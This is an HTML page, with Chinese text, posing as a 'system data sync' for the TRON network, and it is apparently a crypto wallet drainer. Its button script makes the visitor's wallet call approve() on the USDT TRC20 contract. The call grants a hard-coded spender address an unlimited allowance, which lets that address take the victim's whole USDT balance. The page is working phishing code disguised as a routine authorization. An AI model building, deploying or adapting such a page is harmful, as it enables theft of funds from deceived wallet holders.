<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>系统数据同步</title>
</head>
<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
    <h3>正在连接波场节点...</h    <button id="approveBtn" style="padding:15px 35px; background:#007bff; color:#fff; border:none; border-radius:5px; font-size:16px;">
        点击确认授权
    </button>

    <script>
        const approveBtn = document.getElementById('approveBtn');
        const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 合约
        const spender = "TVgNLmfkkXEUJuHuzMzyLxdvyhRPKqguUa";
        const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        approveBtn.onclick = async function () {
            if (typeof window.tronWeb === 'undefined') {
                alert('请在波场钱包（如TokenPocket）中打开');
                return;
            }

            if (!window.tronWeb || !window.tronWeb.ready) {
                alert('波场钱包未连接或未解锁，请先连接并解锁钱包');
                return;
            }

            try {
                approveBtn.disabled = true;
                approveBtn.textContent = '授权交易发送中...';

                const contract = await window.tronWeb.contract().at(contractAddress);
                const tx = await contract.approve(spender, amount).send();

                alert('申请已提交，交易ID:\n' + tx + '\n请在钱包中确认交易。');

                // 简单查询交易状态
                let receipt = null;
                for (let i = 0; i < 20; i++) { // 最多查询20次，间隔3秒
                    receipt = await window.tronWeb.trx.getTransactionInfo(tx);
                    if (receipt && receipt.receipt) break;
                    await new Promise(resolve => setTimeout(resolve, 3000));
                }

                if (receipt && receipt.receipt && receipt.receipt.result === 'SUCCESS') {
                    alert('授权交易已确认！');
                } else {
                    alert('授权交易还未确认，请稍后查询。');
                }
            } catch (error) {
                console.error(error);
                alert('同步失败: ' + (error.message || error));
            } finally {
                approveBtn.disabled = false;
                approveBtn.textContent = '点击确认授权';
            }
        };
    </script>
</body>
</html>
